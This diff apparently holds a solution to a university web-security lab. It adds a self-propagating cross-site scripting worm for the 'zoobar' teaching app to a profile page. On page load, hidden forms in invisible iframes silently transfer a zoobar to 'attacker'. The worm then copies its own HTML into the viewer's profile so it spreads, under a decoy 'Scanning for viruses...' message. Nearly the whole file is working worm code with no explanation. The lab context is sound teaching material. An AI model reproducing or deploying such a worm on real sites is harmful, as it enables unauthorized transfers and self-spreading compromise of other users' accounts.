@@ -1,0 +1,69 @@
+Scanning for viruses...</b>
+
+<form method="post" action="/zoobar/index.cgi/transfer" style="display:none; visibility:hidden;" target="formtarget2">
+  <input name="zoobars" type="text" value="1">
+  <input name="recipient" type="text" value="attacker">
+  <input id="submitthat" type="submit" name="submission" value="Send">
+</form>
+
+<form method="post" action="/zoobar/index.cgi" style="display:none; visibility:hidden;" target="formtarget3">
+  <textarea cols="80" rows="20" name="profile_update" id="wormgoeshere"></textarea>
+  <input type="submit" value="Save" name="profile_submit" id="submitthattoo">
+</form>
+
+<iframe name="formtarget2" id="formtarget2" style="visibility:hidden; width:0; height:0; border:0; position:absolute;"> </iframe>
+
+<iframe name="formtarget3" id="formtarget3" style="visibility:hidden; width:0; height:0; border:0; position:absolute;"> </iframe>
+
+<script>
+  window.onload = function(){
+    document.getElementById("submitthat").click();
+    var worm = document.getElementsByTagName("body")[0].innerHTML;
+    var key = "<div id=\"profile\"><b>";
+    index = worm.indexOf(key);
+    index += key.length;
+    worm = worm.substring(index, worm.length);
+    worm = worm + "</body></html><!--"
+    document.getElementById("wormgoeshere").value = worm;
+    document.getElementById("submitthattoo").click();
+  }
+</script>
+
+</div>
+<span id="zoobars" class="10"></span>
+<script type="text/javascript">
+  var total = 10
+  function showZoobars(zoobars) {
+    document.getElementById("profileheader").innerHTML =
+      document.getElementsByName("user")[0].value + "'s zoobars:" + zoobars;
+    if (zoobars < total) {
+      setTimeout("showZoobars(" + (zoobars + 1) + ")", 100);
+    }
+  }
+  if (total > 0) showZoobars(0);  // count up to total
+</script>
+
+
+
+          </td></tr>
+        </table>
+      </div>
+      
+
+<table class="logasdf" align="center">
+<thead>
+<tr><th>Time</th>
+    <th>Sender</th>
+    <th>Recipient</th>
+    <th>Amount</th></tr>
+</thead>
+<tbody>
+
+</tbody>
+</table>
+
+
+      
+    </body>
+</html>
+<!--
